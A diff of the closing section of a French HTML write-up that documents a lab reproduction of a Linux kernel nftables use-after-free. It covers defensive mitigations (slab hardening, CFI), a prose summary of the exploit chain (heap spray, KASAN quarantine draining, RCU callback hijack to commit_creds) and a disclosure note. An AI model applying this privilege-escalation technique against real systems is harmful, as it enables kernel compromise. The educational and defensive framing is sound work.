+        <td>Avec <code>CONFIG_SLAB_FREELIST_RANDOM=y</code> et <code>CONFIG_SLAB_FREELIST_HARDENED=y</code>, la réoccupation prédictible du slot libéré devient un exercice probabiliste plutôt que déterministe.</td>
+      </tr>
+      <tr>
+        <td><b>CFI (Control-Flow Integrity)</b></td>
+        <td>Étape 10 (callback RCU)</td>
+        <td>Avec <code>CONFIG_CFI_CLANG=y</code>, l'appel indirect via <code>ops->destroy</code> serait validé contre une table de cibles autorisées. <code>commit_creds</code> n'y figurerait pas → trap.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="note">
+    <span class="lbl">Principe</span>
+    La défense en profondeur fonctionne parce que chaque couche (correction du bug, durcissement de l'allocateur, intégrité du flux de contrôle) bloque une étape <i>différente</i> de la chaîne. Un attaquant doit contourner <i>toutes</i> les couches ; un défenseur n'a besoin d'en maintenir <i>qu'une</i>.
+  </div>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">Bilan</span></h2><div class="rule"></div>
+
+  <ul>
+    <li><b>Le bug</b> : un <code>kfree()</code> sans <code>dst_release()</code> dans <code>nft_tunnel_obj_destroy()</code> — une erreur de référence-counting, la classe de bugs la plus commune du noyau Linux.</li>
+    <li><b>L'exploit</b> : spray de <code>msg_mm</code> dans <code>kmalloc-cg-256</code>, drainage de quarantaine KASAN, détournement du callback RCU vers <code>commit_creds</code>.</li>
+    <li><b>Le pivot</b> : trois approches échouées avant de trouver un gadget suffisamment tolérant. La solution n'est pas venue d'une inspiration mais de l'élimination méthodique des alternatives.</li>
+    <li><b>La discipline</b> : documenter chaque impasse (16 notes, 1300 lignes) — parce que dans l'exploitation noyau, ce qui <i>ne</i> marche <i>pas</i> restreint l'espace de recherche autant que ce qui marche.</li>
+  </ul>
+
+  <div class="note">
+    <span class="lbl">Divulgation</span>
+    CVE-2022-32946 est un bug connu et corrigé. Ce travail est une reproduction documentée à but éducatif, réalisée entièrement en environnement de laboratoire isolé. Aucune cible de production n'a été touchée.
   </div>
 </article>
 
 <div class="wu-foot"><div class="row">
   <a href="../#writeups">← tous les write-ups</a>
   <div class="more">
-    <a href="ctf-reverse-engineering.html">CTF &amp; RE →</a>
     <a href="wow-client-re.html">Game hacking : reversing un client MMO →</a>
+    <a href="ctf-reverse-engineering.html">CTF & RE →</a>
   </div>
 </div></div>
 </body>
